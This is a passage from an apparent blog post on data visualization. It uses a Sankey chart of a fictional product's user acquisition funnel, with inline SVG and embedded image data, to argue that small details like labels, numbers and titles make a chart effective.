<p>It's not controversial to say that this idea – small details transforming a work from "meh" to "good" – is true in just about every communication medium. Small things reduce the cognitive load and make the medium itself disappear, leaving only the story. A great screenplay, an enthralling book, a song that grooves so well it can either fade into the setting or command your attention. "Good" work is not contructed by accident yet feels natural. And so it is with good data visualization. When it's really good, the graphic choices disappear, and the insights remain.</p>
<h3 id="an-example"><a href="#an-example">¶</a> An Example</h3>
<p>Let's see the difference between these two framings – <em>picking a graphic</em> vs. <em>telling the story well</em> –  through a practical example. Say you are fixated on “which graphic?” and pick a Sankey chart as a way of expressing some sort of user acquisition funnel for your company's newly-launched product, Sprockets Desktop. The software package you're using can easily express a series of state transitions as a static Sankey diagram, and you're surprised by how easy it is to get something together. You share the chart below with the product manager, who has never seen the acquisition funnel numbers before: <em>"Here's the acquisition funnel we talked about. Any thoughts?"</em></p>

<figure>

<figcaption>
  Stopping at "what graphic to use?"

</figcaption></figure>
<p>The response you get back from the very busy product manager is, well, terse:</p>

<blockquote>
<p><em>Looks good, thanks.<p>
– the PM</p></em></p>
</blockquote>
<p>You've reached a crucial moment. The product manager may never give you feedback on what's wrong, especially if they are not particularly data-savvy or don't have the time. But you can tell they're underwhelmed.</p>
<p>And this is where people sometimes screw it up. They assume it's because the visualization method isn't right. Before you change directions, let's say you prod this product manager for some real feedback. This encourages them to unleash a longer critique:</p>

<blockquote>
<p><em>What period of time is this chart for? These labels look like columns in a SQL resultset and I don't understand all of them. This Sankey chart gives me a good sense of the overall funnel dynamics but it's missing the numbers. Are these user states big or small in practice? I'd like to just SEE the numbers on the thing directly – there’s so much room available. This is for Sprockets Desktop, right? Why isn’t the title more descriptive? How do you define these different states? Can I get the raw data somehow? It's neat to see this funnel, but I'm struggling to understand it. Sorry, just being honest!<p>
– the PM</p></em></p>
</blockquote>
<p>Changing what type of graphic you use won't answer these questions. The reader didn't even criticize the choice of Sankey chart.</p>
<p>Now, let's say you shift your thinking from  <em>picking a graphic</em> to <em>telling the story well</em>, and add the small things they complained about:</p>
<figure>
  <div>
    <a href="https://hamiltonulmer.com/img/sankey-annotation.svg"><!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->

<svg width="100%" viewBox="350 100 1020 475" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" xmlns:serif="http://www.serif.com/" style="fill-rule:evenodd;clip-rule:evenodd;">
    <use xlink:href="#_Image1" x="366" y="308.577" width="237.942px" height="187.8px" transform="matrix(0.999756,0,0,0.998939,0,0)"></use>
    <use xlink:href="#_Image2" x="613.709" y="309.25" width="237.894px" height="127.972px" transform="matrix(0.999553,0,0,0.999779,0,0)"></use>
    <use xlink:href="#_Image3" x="861.72" y="293.8" width="237.796px" height="75.992px" transform="matrix(0.999145,0,0,0.9999,0,0)"></use>
    <use xlink:href="#_Image4" x="862.125" y="371.316" width="237.698px" height="30.788px" transform="matrix(0.998733,0,0,0.993152,0,0)"></use>
    <use xlink:href="#_Image5" x="1108.53" y="294.43" width="237.971px" height="61.826px" transform="matrix(0.999877,0,0,0.997191,0,0)"></use>
    <use xlink:href="#_Image6" x="1109.85" y="356.285" width="238.618px" height="29.857px" transform="matrix(0.998401,0,0,0.995235,0,0)"></use>
    <use xlink:href="#_Image7" x="1109.85" y="387.947" width="238.618px" height="40.569px" transform="matrix(0.998401,0,0,0.989495,0,0)"></use>
    <use xlink:href="#_Image8" x="1110.55" y="330.721" width="239.382px" height="79.74px" transform="matrix(0.997426,0,0,0.996748,0,0)"></use>
    <use xlink:href="#_Image9" x="366.112" y="184" width="980.45px" height="125.94px" transform="matrix(0.999439,0,0,0.999521,0,0)"></use>
    <use xlink:href="#_Image10" x="862.37" y="400.37" width="485.236px" height="71.658px" transform="matrix(0.998428,0,0,0.995255,0,0)"></use>
    <use xlink:href="#_Image11" x="613.795" y="436.307" width="732.691px" height="109.832px" transform="matrix(0.999578,0,0,0.998473,0,0)"></use>
    <rect x="356.132" y="190.476" width="10" height="296"></rect>
    <text x="372.132px" y="204.676px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">W<tspan x="385.093px 392.879px " y="204.676px 204.676px ">eb</tspan> Sessions</text>
    <text x="372.132px" y="220.676px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">100% (163,500)</text>
    <rect x="603.632" y="317.825" width="10" height="177.6"></rect>
    <text x="619.632px" y="332.025px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Signups</text>
    <text x="619.632px" y="348.025px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">60% (98,100)</text>
    <rect x="851.132" y="310.11" width="10" height="118.4"></rect>
    <text x="867.132px" y="324.31px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">New Installs</text>
    <text x="867.132px" y="340.31px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">40% (65,400)</text>
    <rect x="1098.63" y="294.224" width="10" height="59.2"></rect>
    <text x="973.604px" y="308.424px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Complete Proﬁles</text>
    <text x="1012.58px" y="324.424px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">20% (32,700)</text>
    <rect x="1098.63" y="369.424" width="10" height="29.6"></rect>
    <text x="982.935px" y="383.624px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Skipped Proﬁles</text>
    <text x="1014.58px" y="399.624px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">10% (16,350)</text>
    <rect x="1346.13" y="319.288" width="10" height="50.32"></rect>
    <text x="1264.67px" y="333.488px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Activations</text>
    <text x="1265.08px" y="349.488px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">17% (27,795)</text>
    <rect x="1346.13" y="385.608" width="10" height="38.48" style="fill:rgb(177,177,177);"></rect>
    <text x="1242.2px" y="399.808px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Didn't Activate</text>
    <text x="1267.08px" y="415.808px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">13% (21,255)</text>
    <rect x="1346.13" y="184.888" width="10" height="118.4" style="fill:rgb(177,177,177);"></rect>
    <text x="1244.27px" y="199.088px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Didn't Sign Up</text>
    <text x="1256.08px" y="215.088px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">40% (65,400)</text>
    <rect x="1346.13" y="440.088" width="10" height="29.6" style="fill:rgb(177,177,177);"></rect>
    <text x="1178.73px" y="454.288px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Never Launched the App</text>
    <text x="1263.08px" y="470.288px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">10% (16,350)</text>
    <rect x="1346.13" y="485.688" width="10" height="59.2" style="fill:rgb(177,177,177);"></rect>
    <text x="1250.69px" y="499.888px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Didn't Install</text>
    <text x="1260.08px" y="515.888px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">20% (32,700)</text>
    <circle cx="362" cy="525px" r="2" fill="gray"></circle>
    <line x1="362" x2="450" y1="525px" stroke-dasharray="4,1" y2="525px" fill="gray" opacity=".5" stroke="gray" marker-end="url(#arrow)"></line>
    <text x="460px" y="524px" dy=".35em" font-size="12" font-style="italic" fill="gray" text-anchor="start">funnel direction</text>
    <g transform="matrix(1,0,0,1,278.507,75.402)">
        <text x="81.948px" y="47.486px" style="font-family: var(--font--comment), 'Arial', sans-serif;font-size:16px; fill: var(--color--comment)">SPROCKETS DESKTOP</text>
        <text x="81.948px" y="72.271px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:24px; fill:var(--color--text);">User Acquisition Journey</text>
        <text x="81.948px" y="93.729px" style="font-family: var(--font--comment), 'Arial', sans-serif; font-size:14px; fill:var(--color--comment)"><tspan style="font-style: italic">% of Web Sessions</tspan>, October 25th - October 31st, 2020</text>
            <text x="1075" y="50" text-anchor="end" font-size="12" style="font-family: var(--font--comment); fill: var(--color--link);">query</text>
            <text x="1075" y="75" text-anchor="end" font-size="12" style="font-family: var(--font--comment); fill: var(--color--link);">dataset</text>
    </g>
    <defs>
        <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse">
            <path d="M 0 0 L 10 5 L 0 10 z"></path>
        </marker>
        <image id="_Image1" width="238px" height="188px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAAC8CAYAAAB/qJLeAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAELklEQVR4nO3aTXLaWBiG0Y8fx7E7M6Y9yVZ6LZqxHs3YTW8lU8262k78Qw8sEgzGAUwDr31O1S2jaw8urnpAutKgabuvVXVVVfN+PC69PurxbDqZF/Bb46r6q6r+PPVCqqqatqt6HvVy2Pcr427LuV3n76rqfjadPPzPbxf2Nj71Al4w6Meqy2Muov8QWQ36R1V9r6rb/ufyeGnu57wPAg7pHMM9J+M60P+oabuHej3y1bnbqvq3qm76cetSggXhHs+oqq77sZem7RYR39TzqDcez6aT729bNudIuFmu+rG1pu0e63nQW0U/m07uDrdsDk2479+wqv7ox9b6U/udvt3r6Rv+/mArZyPhssmoqr70Y2sr1/K7XNM/m5tNJ48HeRfvlHA5tDdfy1dVNW13X+tB/6jD3fZbzD8kbvoJl3O12NHf6RR/H/1ZwqbQH+rEDya9cPyPcOHpLGFUR35W4A2+DU+9AmB3woVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAw/n8cXDqRQC7GQ4Gw/mpFwHsxqkyBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBpX1d9V9aWeIh4sjVMeD6tq1K9vdVz0v4MPa3DqBeyjabtBrYd9UZtD32b+oqo+VdXlyrg40tuCbX2LDPeYmrYb1nrMn/eYc5bAoQj3WJq2G9dTyNdVdbU0Xju+LsGzTrjnrmm7i3o97E2/s/H4fgn3vWra7lNtH/ni9ecK3ff4YITLL/2m32WtR7567f7adf346Av/eITLYTVtN6r9N/MW4S/v9LNOuJy3/oNgm1t8u9wO/N3fbnq+4FwIF3bR3x489YNKN/8BaBQxe31z5s0AAAAASUVORK5CYII="></image>
        <image id="_Image2" width="238px" height="128px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAACACAYAAAAMEFUIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAC8UlEQVR4nO3YPW5aQQCF0YuD4yitm6wg+8he6FgPnZvsLg1tFPwDaXDkWGDg2QZf+xxpBBq9J81DfGKYUYA3ZTKbj5KMkpytXx+P1eh0y4PDTGbzsyTjJJ/Wrw/fPzU35PpNwTwc26J67j37+DXe80I4yGQ2P09ysWF82TL/cJxnc2Cs+TD4Z71F+5zdYe0z7OZekXDfgXVwLxHbxbHXzjDCPaH1f7Z9Ytq1vTw/9to5LeEOMJnNx3mZXzefP4O8my/OZDYfeoL4eG7bocrDcXakx4KNxpPZ/HuSr3nZI+1Dj8u3XXvI8T18GOMkP5J8O/VCgP3Z8kEh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UKZ1WopXGgzGp0JFxoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwqNT70AOIHbJHePXjfN3SVZJlkdMA69fsh9v4XLW7BM8ifJYsu4TnKT3aHtnLuaXt4d66Fek3B5jttsj+1+PBXkIsnivcR0TML9mK6zO7id42p6uTz6ykki3Db7RrXpV+56PX99Nb1cHX3lvCjhvr5VBmwfN4wbwXFPuP9bZfOhxm2Gxba4ml7eHPcR+AgODXfokfeQI/L7e5LDju+fc+LoPxsVxkl+rt9vjcgWDd6Wvyp5ER6r/UC5AAAAAElFTkSuQmCC"></image>
        <image id="_Image3" width="238px" height="76px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAABMCAYAAABqOovHAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADGElEQVR4nO3cX26iUBiH4R/WsXXi/Om4g9nObIM71sMde5qVMGrbpGpHmQtxShFUVDh88D4JQU/a5Nj0zSkHrScAlflhfCdpkDvyY3V9zdJr4DUCjfPD2JN0L+khdy57nB0b6Xg8rrv5M3Q8AeBAupqdiuvU2KfGJ94gwkVj/DAeSfqSOSa55/uxkas5WkG4uJofxvcqDjH/vNOrYJMIF6XS68SJpO/pURYlQTaMcHvOD+PP2kX5mDvvjzt3s0MZwu249M/YfYRFcXI9aRDhGueH8VCHYWYfj93NDnUh3Jbzw3gg6asOV8v9eeJudnCFcB3LbAAVrZaP2kXr+oY/WoZwa+aH8ViH9yq/iQ0gXIFwL5Tuxp66dzkRUaIGhJuRXk8+qPwNBBMRJFqgM+Gmu6uXvKc1O9aZnwe67aa/qOmKdeojSlU+2lQlvsEtXwvQZkM/jH9pt1lSNbaiMQANGEr6KemH64kAOB+rJGAQ4QIGES5gEOECBhEuYBDhAgYRLmAQ4QIGES5gEOECBhEuYBDhAgYRLmBMkmwJF7DG8waEC1hEuIBBhAsYRLiAQYQLGES4gEGECxhEuIBBhAsYRLiAQYQLGES4gEGECxg0SJKt6zkAqGjgeSy6gDVUCxhEuIBBhAsYRLiAQYQLGES4gEGECxhEuIBBhAsYRLiAQYQLGES4gEFD1xMAemYraZOes0d+7NjXLAgXfbOVtJS0ypxXJWMrvcdyTmxHA4yCaXKrF0G4sORN5wVXOhYF07/NT/v2CBeubSS9SHrOHEXPl1Ew5b8+pAgXddmoPML/z6Ng+upshoYRLi6xkTSXNEvPC+XCJMh6ES6KJNrFmI1zf55LernlRguqI9z+etZ7iPk4n7iebDfC7a5XFa+WM0mLruyu9hXh2rVW8Wo5kzSPguna4dxQM8Jtr/wG0Ic42fzpN8J1400fb5Fkb5OwAYSTCPe21jrv3iV/xuIqhHuefZDH3tlDkGhMH8Jd64L3tGbHomC6aX7aQLm2hJvo+CctLo1vxXUiumgo6beksa7/jOBF38eNfqC6f8+VOQrUh4p7AAAAAElFTkSuQmCC"></image>
        <image id="_Image4" width="238px" height="31px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAAAfCAYAAADgIPGeAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAyUlEQVR4nO3asQ3CUBBEwQVBRjH0QCu0RB1URkYGkkmIQYDF90oziaM7X/LkxKvj6bJPss1vpvL5Jdwwen4JN7TPz7nn1Y77JskhyW6GFwH/cV2PvgD4nHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHCh0DrJavQRwGd8caHPJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwotElyfj6/9eufV6Pnl3DD6Pkl3NA+P+eedztuD61fFUrO8zSAAAAAAElFTkSuQmCC"></image>
        <image id="_Image5" width="238px" height="62px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAAA+CAYAAAAs0CcNAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAEj0lEQVR4nO3dXW7bRhQF4EOZVuwodmJTrpMGRYsCbVEURVF0A13MvHE986ZldEcBmqTyJKjt2q1/xD7w0uafZEoiORzyfMAFacqW5sEHHJEzQ09p8y2AfQALAJFs8/urXlv2e7ezMLgDEdXOB/A7gK+aeHOlTQTgVupmg22yfw3gCsD1LAxum2grkUv8ht/fAzCWmtTxhkqbO0iIZfvk/iwM/qvjs4m6oungNsEHcChVidJmAeACwPmKupyFwaL21hI1wMXgbmIE4KXUMpHS5hLlof4M4IxnbuqKoQS3Cg/AgdTbsl+QYJ8BmMv2DHGgz9tqJBHA4K7rhdQ36YNKmxukgpyqT7MwuG+5jTQADG49xgC+lEqLlDafkA3zHOx205YY3GZ5AAKpH9IvpLrd6a73fBYGF203ktzD4NqzrNv9D4A/0zULg8vWW0edxuB2zwTAd1IAAKXNBYphvrLTPOoCBtcNB4i72g/dbaXN3yiG+V87zaO2MbjuSu5L/5gcUNp8RjbM73kRrJ8Y3H45kvopOaC0MciG+cMsDG7sNI/qwuD2X3JV++fkgNJmjmyYP3LyhlsY3GE6kfpFfo6UNn+hGGYOHukoBpeA+H7zqdSvcmyhtPmIbJjnDHM3MLi0zAjAG6nf5Ni90uYDgPfIhpmzqlrmLxb33mi0Y7sd5IYdxBMw0pMw7uQ7c35YJ8dpN8gfjXYi240gp/l4PDOnRXJ7qmycNu83b4ldZWqKB+BY6vv0CzKsMz9O+wzA+SwMeCKpgMElGyZSX+eO38p953zX27DbncXgUpfsAngtlbFidZKHGlK4GVxyRTKbKj/n+YHS5grFQF+hZCFB16+EM7jUJ8+lCmfsPFm1pMoqoaVLB9v+Ls7g0lAlywa/2uSPZZngddYJr/qAgSoPI7hmcIk240vtW/jsdyMLH0pEW2JwiRzE4BI5iMElchCDS+QgBpfIQQwukYMYXCIHMbhEDvIB/AFgD3GIPdmOKvy86rVdqXGFLUdvEa3Js90ApY2H5aHel0oGj5ftP2u/1URWvbMe3G0pbUYoD/QE8aM7DlM1sdRMojq5H9x1KG12UAxzvg6sNZCommEFtwoJ9zHiBcOnudq12DSiBINblXwXP0QxzCdgF5zaxeDWQWmzh/JAH6EDFwCpdxjcJqW63ekwJ1veBqONRNGCwbVBroRPES98ltRrxE8KIHoKg9sVcnY+QTbMp+DoNipicLtMwnyKbJi/AL83Dx2D6xqljY+4W50O8xQM85AwuH2gtBmjGObAaqOoSQxuXyltnqEY5mOrjaK6MLhDIveb3yAb5o0WBCerGNyhU9o8RzHMh1YbRU9hcKlIafMC2TC/BYd1dgmDS9UobQ5QnHhxgvgJetQuBpe2IxfB8mGeIr4Qxv+vZjC41AwZPHKEbJiTGltsWh8wuNS+Jd3uKbiIQVUMLnVHqtv9CstXJ+H/LINLLpFZVROUh/olHsPd94kZDC71j5y5n1odNL/v0vxoBpcIAJQ2u3gM8h6yywRXWR+8bNtUvhhcoqbITK4kwOs+VGDVa9f/A97Fr1H4MhUiAAAAAElFTkSuQmCC"></image>
        <image id="_Image6" width="239px" height="30px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO8AAAAeCAYAAADEvkkFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACcElEQVR4nO3bXW7aQBiF4dfglBIgqeSldBHdiO9Yj+/YUTfQ2y7AUhIIBRJMLzxuB2wr/JnxxOeRPuEYKfmU5GQmM+MAEfknTtIeMDDVB3oX1jU+R1X9DJv6JojcSpykAfCF/6GzrwdH3Lff8yUTv3xpVD65OEn7wMjU2NQ9H4etuO4chVcaY0bEIox2KMcV94aO2vSWwisni5P0nvoQ2vdGrnrsAoVX9pjp6wPwaOqbdV2Ufm9aQD+EjomTdEg5jHZIx+66k1MovJ+I2eaYUD1aFtXJxZ3PZpdtA4XXI3GSDqgeLYuaAIGzBuVmgl5/p/C2hFmZnVA/nX0k3xYRATRtbpyZytqrs4crs0VgH8hPzogcReE9gxklh2i7RBzqfHjjJA2pPzZXd8BghP63FMe8DK+Zih5zTvWY+5qqipfCOEnvgK808+TDNZ6yuKMcOC//6IhcUwh8B364bkTEsTdgDWzM69rc2wLZjeqUr7XWCCY+y4AV+4E7rLr37Pub2TTKbt38pRReaYMMeAUW1mtRS/KAloI4m0ZbJ922hMIrTToMYt3Hf2bTaOeqSV8pvHKqDHgBnoG5qcNQLoClAtkshVcOrciDeVhP5nWhULaDwtstO/KRsghiqWbTaO2uPTlFuMu2QdDru+5DrmNDeaR8sa7nPq6qSrUw6PU1BfLHnPrp7PNsGq0c9iY3pmlze7xTP519Ih81O701IvsU3mbtyPcpP9wumU2jpasmxU8K73mWVG+PlA4YaGVWmtLl8B5zbG5NHkg7lK9a9JE28C2875x/ftWuN42I4ruQfAXzN5c/5dDUkxRbPD48LtKUv+t6N2dNwxFeAAAAAElFTkSuQmCC"></image>
        <image id="_Image7" width="239px" height="41px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO8AAAApCAYAAADdwX4QAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAC2klEQVR4nO2d227bMAxAaTtthw3YHxfgN++pyMXbg6mGURTPTnyR5XMAIopjNEaRE9G6MJWqfojID+n4K1debT8MVfXnAsATHCx+LvmmqipyK3Qr/cK3qeBLAPbMYcX3rixERJpn/oB9CSTFTsRFVduXrhggI9aUdypqi/9isl9ctPFzVb3McpUAE1OCvGNppKend4J7sc8h6L0hF/Yo7xCC4G/xCybvOQ56bFga5B1PLSLvFt/Y4FlK6vPiVwi7oPr8/PzVNM3vtS+kcO6klk5sRsvhaQ5N89RAL4wjTMndYKm2F/qkqqeFrw02CmnzuoR7649wwKXfRxE5SSc0qTfcgbz5UUk3UPY9WGZCn3wgNCDvNqgkGiSzUe9YaEa8dwTybpdaunTbp9yx0EfmpcsFecsiJfRF7ntohC4A5C2fMCgWdo4hdCFUqtpIJ3Hlj0/QDhsPatdOBeTBWe6FZh46Y1aXR1VTQtdRu47adXQc5sELfRQWlmTF5j/4Jn+f4I17ZEXK65yiQOiV2Ly8Y7HbBC9z6jmMI14pxg6sBdidvENQ1VquSxoP0gmdXOIIvbADa0aQdwSWonuRffC/HE5yB5Z01U5IwQfCB24i3Kh9HIOqfMA3pOADQd6ZSaTgPhWHcVDCyIG8K2Ep+EGumxBuNiPA08RihwKEd1VIt56iI29GREK/2yODZPORKiscH0uVIc6i/jjyZo4JHffOCJ0PvT8wIFfZ/flx+9HrfeeckXeDuPvo0Du/CffQe+MP8haCCR330AhdLshbMia0753fhKmrUkDevWHz0XEPjdDbA3lBRFVTU1Z8NvIGeSENQmcP8sJwVNVPVbFSbF2QF17DLSxJBcxE27bIC/NhqTc7sOYBeWF52IE1CcgL+WDz0mEqK9xPU8IoDfLCdqCE0Q3IC2Xheu9UpdFUbBXkhX0TVR9NlRXuC3/O0iAvwBQ8qD/+6AcGpmh//QPYWllTHlRvWgAAAABJRU5ErkJggg=="></image>
        <image id="_Image8" width="240px" height="80px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABQCAYAAAAnSfh8AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAFhElEQVR4nO2dS27jOhBFr/x3nGkDvRztKtNampfzgJ52J7ZsS2/AYqwociwn+pCsewBCdiB02DFPSlX8JBORDMAvOKpaa75vfq3L/SWAUkRKEEJ6Z6HX+ZDfREQA4AIntL+WbV8Tkar9XyGENFncv6U35tqWX92k0bpN9AuAs4icB+4nIdEwpsBdmWlr7ZtG6HOzUWxikRAFvkcGF8U/RPIbYp9E5DJ6DwkZiRgFvkUXsU8AChE5jd89QvonJYFvURd7C7xLXdTaicUzEiMWBG4jA7DWBgCVRuUCwBEUmkRCpvPAv6fuSIDUI3RBoUmIWI3AXVhpAwBohD4CODCHJqFAgbvj8+hnrWwf4GQupu0WsUz28vKSbbdbPkJ/nxJXmY9Td4bYgjlwv5TQx2wAR+bNZGj4CN0vM7ipqi1cZdvLfKDMZAgo8HBkADbaKhF5A/DGnJn0CQUehwzAE4AnXbP9Ciczt1mSHzHP8zwD8Dx1Rwwxg1tA8pzn+TLP82q/33O9NvkWjMDTsgGw0UjsozJ3VZHOsAodHgWczCx8kbswAoeHXwFWisg/AK/MlcktmAOHi99wscvzfJ7n+Xm/3zMikw9Q4PDx2yF3WvQqWfQiHgocFwsAT3mer7V6zYKXcXwOfIH7TQ+9Zu23k0BYAVjppoq/cNVrPl4b5KaoWp3299Sl7vp+Djfn6a+zr74f+RF+GuofC162GFUoEfEi16VuE302Zr8SogLwBicyH68NEGRE1Ojvj5ZtNsrdjSOAv1x7nTZBCvwVIjLHZ6mXiPD/MhInuIj8NnVHSP8kM+hbxP50xKxxLgD8whAWvBIhGYHb0EfxVa0xUrs82Re8OJ8cOaYGswq9xEepTf0MGviCFw/pixTLgxcAICJLuCWLloUu4ApePNMrMiwO1i9Rof1JGtY2e5zh8mQuDIkECvwFIrLAVWZLBbES14IXF4YEDAXuiFa5vcyrO7enAheGBA4F/ga6oqwus4Wf4wFOZC4MCQgLA29QtLK9gTu0zkJkLuBEPkzdEUKBe0Vz5i2czKkv+eROqACgwAMhIhs4mTdT92VguBNqQijwwGi+/AQnc8rTUhVcnvzKPHk8KPCIiMgKTuYN0v7Zn+Gq15yGGpiUB1GwaFTewUaufIDLk1n0GgAKPCFawd7CnUk2n7g7Q8PD6weAAgeCFr12sDMV5f/YGyvYP4ACB4bmyTukX70GXOGrwPVPsDJffhAKHCg6p7yDe8S28jnVZeZe5Q5YGRjRUpuG2iH9gledE64yM2e+AQWOhFrBa4e055PbOOMqMw8fqEGBI0RE1nCVawsFryY+by4AHK0LTYEjRg8f8HmyVepCFwBOlirbFDgBdK+yXxhi/TOt4PLnd6lTFtr6h50Umif7glfqC0Me4QSXR/vrOZUqNwVOFBHxBS9LRwE9QoWG1IhQbAqcOLow5Bnu5E1yH/8Ifm60MsRHcQpsBKMLQ/qmrLVL4/r+eswVZfwgjWFsJ9RUVPgsum9V7Z6q6/tb0Z8CG8XYTqhUaMr9hwITazuhUuI/CkzeMbYTKgUoMPkMC17RQIHJbQzvhIoFCkzuY/Dw+ligwOQxjB1eHzoUmHwf3dboj8kl40OByc/RXNlHZWuHDUwJBSb9olNRW7CCPQYUmAxDrfC1gdtIwbHWPxSYDI/KvMZVZha/+oECk/HR4pePzpT5+1BgMi2aM3uZuaniMSgwCQc9pM9HZ54kch8KTMJE8+ZVo5GPUGASByr0Ek7ktb62Pn4pMImThtC+WRvPFJikg+bQKzixF9pSHuMUmKSNHnq/wEepUxGbAhOb6K6qthaTExSYkDo1sefaZtrqr0OBAhPyCFo8a0rdJvoYi1IoMCFDodssfctqDT29//M/oU4NlA/K/ZQAAAAASUVORK5CYII="></image>
        <image id="_Image9" width="981px" height="126px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA9UAAAB+CAYAAAAqeTKvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAD9ElEQVR4nO3czWrbQBhA0Ukxhfap9cR9gEJpV4FSnDTc6GdGnLOTxtY32uki7JcBAAAAvGvbtpdn55+eBACAMzx5SP3f8Vvn3ju/yvoMezh6j2fsrzqzjc6aZc7xfj6u3gEAwNFCuB19fJcZewYxwJJENQDsYKe3bbMfrzoDAA4jqgEWMuHbtrOC6Or7Em0AwFOiGib21p8h/OWu63cIwSNmAAAwmce2bd/GGF/Cd/2Qf51ZZ8/cY87sf7JxxjoAADC5xxjj+xjj69UbAQAAgNWUN9QAAADAENUAAACQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgEhUAwAAQCSqAQAAIBLVAAAAEIlqAAAAiEQ1AAAARKIaAAAAIlENAAAAkagGAACASFQDAABAJKoBAAAgEtUAAAAQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgEhUAwAAQCSqAQAAIBLVAAAAEIlqAAAAiEQ1AAAARKIaAAAAIlENAAAAkagGAACASFQDAABAJKoBAAAgEtUAAAAQiWoAAACIRDUAAABEohoAAAAiUQ0AA